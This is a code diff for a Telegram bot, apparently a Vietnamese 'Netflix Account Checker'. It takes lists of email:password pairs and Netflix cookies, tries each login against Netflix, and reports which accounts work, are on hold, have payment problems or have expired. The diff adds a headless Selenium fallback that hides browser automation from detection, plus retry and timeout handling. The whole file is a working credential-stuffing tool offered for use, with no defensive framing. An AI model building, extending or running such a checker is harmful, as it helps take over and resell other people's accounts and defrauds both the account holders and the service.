@@ -4,6 +4,11 @@ import time
 import logging
 import asyncio
 import requests
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.options import Options
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
@@ -179,16 +184,16 @@ def format_account_result(info: dict, cookie_result: dict) -> str:
     cookie_reason = cookie_result.get("reason", "")
 
     if cookie_valid:
-        status = "HOAT DONG"
+        status = "HOẠT ĐỘNG"
     else:
         # Map reason to Vietnamese
         reason_map = {
-            "COOKIE_HET_HIEU_LUC": "HET HIEU LUC",
-            "KHONG_CO_COOKIE": "KHONG CO COOKIE",
-            "COOKIE_KHONG_HOP_LE": "COOKIE KHONG HOP LE",
-            "COOKIE_KHONG_XAC_DINH": "KHONG XAC DINH"
+            "COOKIE_HET_HIEU_LUC": "HẾT HIỆU LỰC",
+            "KHONG_CO_COOKIE": "KHÔNG CÓ COOKIE",
+            "COOKIE_KHONG_HOP_LE": "COOKIE KHÔNG HỢP LỆ",
+            "COOKIE_KHONG_XAC_DINH": "KHÔNG XÁC ĐỊNH"
         }
-        status = reason_map.get(cookie_reason, "KHONG XAC DINH")
+        status = reason_map.get(cookie_reason, "KHÔNG XÁC ĐỊNH")
 
     result = f"""
 📧 Email: {info['email']}
@@ -232,17 +237,17 @@ def format_account_result_v2(info: dict, login_result: dict, cookie_result: dict
 
     # Map ly do mat khau
     if login_valid:
-        status = "✅ HOAT DONG"
-        status_detail = "DANG_NHAP_THANH_CONG"
+        status = "✅ HOẠT ĐỘNG"
+        status_detail = "ĐĂNG_NHẬP_THÀNH_CÔNG"
     else:
         reason_map = {
-            "SAI_MAT_KHAU": "❌ SAI_MAT_KHAU",
-            "TAI_KHOAN_KHONG_TON_TAI": "❌ TAI_KHOAN_KHONG_TON_TAI",
-            "TAI_KHOAN_BI_KHOA_TAM": "❌ BI_TAM_KHOA_(ON_HOLD)",
-            "LOI_THANH_TOAN": "❌ LOI_THANH_TOAN",
-            "TAI_KHOAN_HET_HAN": "❌ HET_HAN",
-            "KHONG_XAC_DINH": "❌ KHONG_XAC_DINH",
-            "LOI_TRUY_CAP": "❌ LOI_TRUY_CAP"
+            "SAI_MAT_KHAU": "❌ SAI_MẬT_KHẨU",
+            "TAI_KHOAN_KHONG_TON_TAI": "❌ TÀI_KHOẢN_KHÔNG_TỒN_TẠI",
+            "TAI_KHOAN_BI_KHOA_TAM": "❌ BỊ_TẠM_KHÓA_(ON_HOLD)",
+            "LOI_THANH_TOAN": "❌ LỖI_THANH_TOÁN",
+            "TAI_KHOAN_HET_HAN": "❌ HẾT_HẠN",
+            "KHONG_XAC_DINH": "❌ KHÔNG_XÁC_ĐỊNH",
+            "LOI_TRUY_CAP": "❌ LỖI_TRUY_CẬP"
         }
         status = reason_map.get(login_reason, f"❌ {login_reason}")
         status_detail = login_reason
@@ -299,10 +304,10 @@ def check_with_requests(email: str, password: str) -> dict:
 
     try:
         # 1. Lấy trang login để lấy CSRF token
-        resp = session.get(NETFLIX_LOGIN_URL, headers=headers, timeout=10)
+        resp = session.get(NETFLIX_LOGIN_URL, headers=headers, timeout=30)
         if resp.status_code != 200:
             logger.warning(f"[Requests] Không thể truy cập trang login: {resp.status_code}")
-            return {"valid": False, "reason": "LOI_TRUY_CAP"}
+            return {"valid": False, "reason": "LOI_TRUY_CAP", "method": "requests"}
 
         # Tìm token trong HTML
         match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
@@ -322,28 +327,29 @@ def check_with_requests(email: str, password: str) -> dict:
             NETFLIX_LOGIN_URL,
             data=login_payload,
             headers=headers,
-            timeout=10,
+            timeout=30,
             allow_redirects=False
         )
 
         # Lấy response text để parse lỗi
         resp_text = login_resp.text.lower()
 
-        # Kiểm tra các lỗi cụ thể
-        if "incorrect password" in resp_text or "mat khau khong dung" in resp_text:
-            return {"valid": False, "reason": "SAI_MAT_KHAU"}
+        # Kiểm tra các lỗi cụ thể (chi khi co response text)
+        if login_resp.status_code != 302:
+            if "incorrect password" in resp_text or "mat khau khong dung" in resp_text:
+                return {"valid": False, "reason": "SAI_MAT_KHAU", "method": "requests"}
 
-        if "we're sorry" in resp_text or "khong tim thay tai khoan" in resp_text:
-            return {"valid": False, "reason": "TAI_KHOAN_KHONG_TON_TAI"}
+            if "we're sorry" in resp_text or "khong tim thay tai khoan" in resp_text:
+                return {"valid": False, "reason": "TAI_KHOAN_KHONG_TON_TAI", "method": "requests"}
 
-        if "your account is on hold" in resp_text or "tai khoan bi tam dung" in resp_text:
-            return {"valid": False, "reason": "TAI_KHOAN_BI_KHOA_TAM"}
+            if "your account is on hold" in resp_text or "tai khoan bi tam dung" in resp_text:
+                return {"valid": False, "reason": "TAI_KHOAN_BI_KHOA_TAM", "method": "requests"}
 
-        if "payment" in resp_text and ("issue" in resp_text or "problem" in resp_text):
-            return {"valid": False, "reason": "LOI_THANH_TOAN"}
+            if "payment" in resp_text and ("issue" in resp_text or "problem" in resp_text):
+                return {"valid": False, "reason": "LOI_THANH_TOAN", "method": "requests"}
 
-        if "expired" in resp_text or "het han" in resp_text:
-            return {"valid": False, "reason": "TAI_KHOAN_HET_HAN"}
+            if "expired" in resp_text or "het han" in resp_text:
+                return {"valid": False, "reason": "TAI_KHOAN_HET_HAN", "method": "requests"}
 
         # Nếu server trả về 302 (redirect) -> đăng nhập thành công
         if login_resp.status_code == 302 and "Set-Cookie" in login_resp.headers:
@@ -351,39 +357,125 @@ def check_with_requests(email: str, password: str) -> dict:
             browse_resp = session.get(
                 "https://www.netflix.com/browse",
                 headers=headers,
-                timeout=10,
+                timeout=30,
                 allow_redirects=False
             )
             if browse_resp.status_code == 200 and "browse" in browse_resp.url:
                 logger.info(f"[Requests] Thành công: {email}")
-                return {"valid": True, "reason": "DANG_NHAP_THANH_CONG"}
+                return {"valid": True, "reason": "DANG_NHAP_THANH_CONG", "method": "requests"}
 
-        return {"valid": False, "reason": "KHONG_XAC_DINH"}
+        return {"valid": False, "reason": "KHONG_XAC_DINH", "method": "requests"}
 
+    except requests.exceptions.Timeout:
+        logger.warning(f"[Requests] Timeout: {email}")
+        return {"valid": False, "reason": "TIMEOUT", "method": "requests"}
+    except requests.exceptions.ConnectionError:
+        logger.warning(f"[Requests] Connection error: {email}")
+        return {"valid": False, "reason": "MAT_KET_NOI_MANG", "method": "requests"}
     except Exception as e:
         logger.warning(f"[Requests] Lỗi: {e}")
-        return {"valid": False, "reason": f"LOI_HE_THONG: {str(e)}"}
+        return {"valid": False, "reason": f"LOI: {str(e)[:50]}", "method": "requests"}
+
+# ================== HÀM KIỂM TRA BẰNG SELENIUM ==================
+def check_with_selenium(email: str, password: str) -> dict:
+    """
+    Kiểm tra bằng Selenium (dùng browser).
+    Trả về dict với keys: valid (bool), reason (str)
+    """
+    chrome_options = Options()
+    chrome_options.add_argument("--headless")
+    chrome_options.add_argument("--no-sandbox")
+    chrome_options.add_argument("--disable-dev-shm-usage")
+    chrome_options.add_argument("--disable-gpu")
+    chrome_options.add_argument("--window-size=1920,1080")
+    chrome_options.add_argument(f"user-agent={USER_AGENT}")
+    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    chrome_options.add_experimental_option('useAutomationExtension', False)
+
+    driver = None
+    try:
+        driver = webdriver.Chrome(options=chrome_options)
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+
+        logger.info(f"[Selenium] Đang kiểm tra {email}")
+        driver.get(NETFLIX_LOGIN_URL)
+        wait = WebDriverWait(driver, 30)
+
+        # Nhập email
+        email_input = wait.until(EC.presence_of_element_located((By.NAME, "userLoginId")))
+        email_input.clear()
+        email_input.send_keys(email)
+
+        # Nhập password
+        pass_input = driver.find_element(By.NAME, "password")
+        pass_input.clear()
+        pass_input.send_keys(password)
+
+        # Click nút đăng nhập
+        login_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
+        login_button.click()
+
+        # Đợi chuyển hướng
+        time.sleep(10)
+
+        # Kiểm tra URL hiện tại
+        current_url = driver.current_url
+        page_source = driver.page_source.lower()
+
+        # Kiểm tra lỗi cụ thể
+        if "incorrect password" in page_source:
+            return {"valid": False, "reason": "SAI_MAT_KHAU", "method": "selenium"}
+        if "your account is on hold" in page_source:
+            return {"valid": False, "reason": "TAI_KHOAN_BI_KHOA_TAM", "method": "selenium"}
+        if "payment" in page_source and "issue" in page_source:
+            return {"valid": False, "reason": "LOI_THANH_TOAN", "method": "selenium"}
+        if "we're sorry" in page_source:
+            return {"valid": False, "reason": "TAI_KHOAN_KHONG_TON_TAI", "method": "selenium"}
+
+        # Kiểm tra thành công
+        if "browse" in current_url or "profiles" in current_url:
+            logger.info(f"[Selenium] Thành công: {email}")
+            return {"valid": True, "reason": "DANG_NHAP_THANH_CONG", "method": "selenium"}
+
+        return {"valid": False, "reason": "KHONG_XAC_DINH", "method": "selenium"}
+
+    except Exception as e:
+        logger.error(f"[Selenium] Lỗi: {e}")
+        return {"valid": False, "reason": f"LOI: {str(e)[:50]}", "method": "selenium"}
+    finally:
+        if driver:
+            driver.quit()
+
 
 # ================== HÀM KIỂM TRA TỔNG HỢP ==================
 async def check_account(email: str, password: str) -> str:
     """
-    Kiểm tra một tài khoản bằng requests.
+    Kiểm tra một tài khoản: thử requests trước, nếu fail thì dùng Selenium.
     Trả về chuỗi kết quả với lý do cụ thể.
     """
     logger.info(f"Đang kiểm tra: {email}")
+
+    # Thử requests trước
     result = check_with_requests(email, password)
 
+    # Nếu requests timeout hoặc lỗi mạng, thử Selenium
+    if result["reason"] in ["TIMEOUT", "MAT_KET_NOI_MANG", "LOI_TRUY_CAP"]:
+        logger.info(f"[Requests] Thất bại, thử Selenium cho {email}")
+        result = check_with_selenium(email, password)
+
     if result["valid"]:
-        return f"✅ {email}:{password} | HOAT DONG | {result['reason']}"
+        return f"✅ {email}:{password} | HOẠT ĐỘNG | {result['method']}"
     else:
         reason_map = {
-            "SAI_MAT_KHAU": "SAI_MAT_KHAU",
-            "TAI_KHOAN_KHONG_TON_TAI": "TAI_KHOAN_KHONG_TON_TAI",
-            "TAI_KHOAN_BI_KHOA_TAM": "BI_TAM_KHOA_(ON_HOLD)",
-            "LOI_THANH_TOAN": "LOI_THANH_TOAN",
-            "TAI_KHOAN_HET_HAN": "HET_HAN",
-            "KHONG_XAC_DINH": "KHONG_XAC_DINH",
-            "LOI_TRUY_CAP": "LOI_TRUY_CAP"
+            "SAI_MAT_KHAU": "SAI_MẬT_KHẨU",
+            "TAI_KHOAN_KHONG_TON_TAI": "TÀI_KHOẢN_KHÔNG_TỒN_TẠI",
+            "TAI_KHOAN_BI_KHOA_TAM": "BỊ_TẠM_KHÓA_(ON_HOLD)",
+            "LOI_THANH_TOAN": "LỖI_THANH_TOÁN",
+            "TAI_KHOAN_HET_HAN": "HẾT_HẠN",
+            "KHONG_XAC_DINH": "KHÔNG_XÁC_ĐỊNH",
+            "LOI_TRUY_CAP": "LỖI_TRUY_CẬP",
+            "TIMEOUT": "TIMEOUT",
+            "MAT_KET_NOI_MANG": "MẤT_KẾT_NỐI_MẠNG"
         }
         reason_text = reason_map.get(result["reason"], result["reason"])
         return f"❌ {email}:{password} | {reason_text}"
@@ -392,11 +484,11 @@ async def check_account(email: str, password: str) -> str:
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "Netflix Account Checker\n\n"
-        "Cach 1 (dang cu - kiem tra mat khau):\n"
+        "Cách 1 (dạng cũ - kiểm tra mật khẩu):\n"
         "email1:password1\n\n"
-        "Cach 2 (format day du - kiem tra cookie):\n"
+        "Cách 2 (format đầy đủ - kiểm tra cookie):\n"
         "email:password | Country = XX | PLAN = ... | Cookie = ...\n\n"
-        "Tra cu: SAI_MAT_KHAU | BI_TAM_KHOA | LOI_THANH_TOAN | HET_HAN | HOAT_DONG"
+        "Tra cứu: SAI_MẬT_KHẨU | BỊ_TẠM_KHÓA | LỖI_THANH_TOÁN | HẾT_HẠN | HOẠT_ĐỘNG"
     )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -427,7 +519,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Xu ly format cu
     if accounts:
-        await update.message.reply_text(f"Dang kiem tra {len(accounts)} tai khoan (dang cu)...")
+        await update.message.reply_text(f"Đang kiểm tra {len(accounts)} tài khoản (dạng cũ)...")
 
         for email, password in accounts:
             result = await check_account(email, password)
@@ -436,11 +528,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Xu ly format moi
     if parsed_accounts:
-        await update.message.reply_text(f"Dang phan tich {len(parsed_accounts)} tai khoan (format moi)...")
+        await update.message.reply_text(f"Đang phân tích {len(parsed_accounts)} tài khoản (format mới)...")
 
         for info in parsed_accounts:
             # Kiem tra mat khau truoc (quan trong nhat)
             login_result = check_with_requests(info['email'], info['password'])
+
+            # Neu requests timeout/ loi, thu Selenium
+            if login_result["reason"] in ["TIMEOUT", "MAT_KET_NOI_MANG", "LOI_TRUY_CAP"]:
+                logger.info(f"[Requests] That bai, thu Selenium cho {info['email']}")
+                login_result = check_with_selenium(info['email'], info['password'])
 
             # Neu login thanh cong thi khong can kiem tra cookie nua
             cookie_result = {"valid": False, "reason": "BO_QUA"}
@@ -456,10 +553,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await asyncio.sleep(1)
 
     if not accounts and not parsed_accounts:
-        await update.message.reply_text("Khong tim thay tai khoan hop le nao.")
+        await update.message.reply_text("Không tìm thấy tài khoản hợp lệ nào.")
         return
 
-    await update.message.reply_text(f"Hoan thanh!")
+    await update.message.reply_text(f"Hoàn thành!")
 
 def main():
     application = Application.builder().token(BOT_TOKEN).build()
